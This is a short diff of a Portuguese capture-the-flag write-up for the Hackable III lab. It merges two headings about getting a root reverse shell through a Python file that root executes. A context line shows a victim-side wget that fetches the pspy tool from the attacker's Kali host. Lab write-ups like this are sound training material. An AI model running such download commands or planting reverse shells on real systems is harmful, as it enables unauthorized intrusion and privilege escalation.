@@ -80,9 +80,7 @@ vítima: wget http://ip_kali:8000/pspy
 ![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/12.JPG)
 
 
-<h2>Agora é hora da criatividade, o root está executando nosso arquivo python, no nosso caso queremos conseguir uma reverse shell</h2>
-
-<h2>para o reverse shell, usei o de python <https://shellgenerator.github.io> </h2>
+<h2>Agora é hora da criatividade, o root está executando nosso arquivo python, no nosso caso queremos conseguir uma reverse shell para o reverse shell, usei o de python https://shellgenerator.github.io </h2>
 
 ![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/13.JPG)
 
